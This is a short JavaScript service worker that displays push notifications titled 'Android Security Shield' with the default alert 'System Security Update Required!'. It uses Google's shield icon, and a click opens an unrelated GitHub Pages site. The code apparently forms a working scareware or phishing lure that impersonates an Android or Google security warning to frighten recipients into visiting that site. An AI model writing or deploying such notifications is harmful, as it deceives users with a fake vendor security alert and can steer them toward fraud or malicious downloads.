self.addEventListener('push', function(event) {
  const options = {
    body: event.data ? event.data.text() : 'System Security Update Required!',
    icon: 'https://www.gstatic.com/images/branding/product/2x/gshield_96dp.png',
    badge: 'https://www.gstatic.com/images/branding/product/2x/gshield_96dp.png'
  };
  event.waitUntil(
    self.registration.showNotification('Android Security Shield', options)
  );
});

self.addEventListener('notificationclick', function(event) {
  event.notification.close();
  event.waitUntil(
    clients.openWindow('https://rajahribabakumar-hub.github.io/Nob/')
  );
});
